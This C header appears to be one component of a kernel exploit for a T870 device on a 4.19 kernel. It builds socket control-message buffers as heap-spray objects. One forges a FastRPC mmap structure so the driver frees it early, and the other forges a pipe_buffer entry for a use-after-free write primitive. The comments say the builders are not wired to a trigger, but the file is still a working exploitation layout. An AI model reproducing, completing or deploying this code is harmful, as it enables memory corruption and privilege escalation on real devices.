#ifndef T870_RECLAIM_LAYOUT_H
#define T870_RECLAIM_LAYOUT_H

#include <stdint.h>
#include <string.h>

#define T870_CMSG_CONTROL_SIZE 144U
#define T870_FASTRPC_MAP_FLAGS_OFF 36U
#define T870_FASTRPC_MAP_PHYS_OFF 72U
#define T870_FASTRPC_MAP_REFS_OFF 104U
#define T870_FASTRPC_MAP_CTX_REFS_OFF 140U
#define T870_FASTRPC_HEAP_FLAG 4U

#define T870_PIPE_BUFFER_SIZE 40U
#define T870_PIPE_ARRAY_SLOTS 4U
#define T870_PIPE_WRITE_SLOT 2U
#define T870_PIPE_WRITE_OFF \
    (T870_PIPE_WRITE_SLOT * T870_PIPE_BUFFER_SIZE)

static inline void t870_layout_store_u32(unsigned char *buffer,
                                         size_t offset, uint32_t value)
{
    memcpy(buffer + offset, &value, sizeof(value));
}

static inline void t870_layout_store_u64(unsigned char *buffer,
                                         size_t offset, uint64_t value)
{
    memcpy(buffer + offset, &value, sizeof(value));
}

static inline uint32_t t870_layout_load_u32(const unsigned char *buffer,
                                           size_t offset)
{
    uint32_t value;

    memcpy(&value, buffer + offset, sizeof(value));
    return value;
}

static inline uint64_t t870_layout_load_u64(const unsigned char *buffer,
                                           size_t offset)
{
    uint64_t value;

    memcpy(&value, buffer + offset, sizeof(value));
    return value;
}

static inline void t870_build_cmsg_header(unsigned char *control)
{
    memset(control, 0, T870_CMSG_CONTROL_SIZE);
    t870_layout_store_u64(control, 0U, T870_CMSG_CONTROL_SIZE);
    t870_layout_store_u32(control, 8U, 0U);
    t870_layout_store_u32(control, 12U, 0U);
}

/*
 * Exact T870 fastrpc_mmap heap-form overlay. context_free() decrements
 * ctx_refs from 2 to 1 before fastrpc_mmap_free(). The heap branch then
 * decrements refs from 1 to 0, skips hlist_del_init() because ctx_refs is 1,
 * skips dma_free_attrs() because phys is 0, and reaches kfree(map).
 *
 * This function only builds bytes. It is not wired to a FastRPC trigger.
 */
static inline void t870_build_safe_map_control(unsigned char *control)
{
    t870_build_cmsg_header(control);
    t870_layout_store_u32(control, T870_FASTRPC_MAP_FLAGS_OFF,
                          T870_FASTRPC_HEAP_FLAG);
    t870_layout_store_u64(control, T870_FASTRPC_MAP_PHYS_OFF, 0U);
    t870_layout_store_u32(control, T870_FASTRPC_MAP_REFS_OFF, 1U);
    t870_layout_store_u32(control, T870_FASTRPC_MAP_CTX_REFS_OFF, 2U);
}

/*
 * A second, independent control allocation can occupy a freed four-entry
 * pipe_buffer array. Slot 2 begins after the unavoidable 16-byte cmsghdr,
 * so all members needed by the exact 4.19 small-write merge path are fully
 * controlled. The caller supplies original-target-derived runtime values.
 *
 * This function only builds bytes. It is not wired to a pipe UAF trigger.
 */
static inline void t870_build_pipe_write_control(unsigned char *control,
                                                 uint64_t page,
                                                 uint32_t page_offset,
                                                 uint64_t anon_pipe_buf_ops)
{
    const size_t slot = T870_PIPE_WRITE_OFF;

    t870_build_cmsg_header(control);
    t870_layout_store_u64(control, slot + 0U, page);
    t870_layout_store_u32(control, slot + 8U, page_offset);
    t870_layout_store_u32(control, slot + 12U, 0U);
    t870_layout_store_u64(control, slot + 16U, anon_pipe_buf_ops);
    t870_layout_store_u32(control, slot + 24U, 0U);
    t870_layout_store_u32(control, slot + 28U, 0U);
    t870_layout_store_u64(control, slot + 32U, 0U);
}

static inline unsigned int t870_pipe_last_slot(unsigned int curbuf,
                                               unsigned int nrbufs)
{
    return (curbuf + nrbufs - 1U) & (T870_PIPE_ARRAY_SLOTS - 1U);
}

#endif
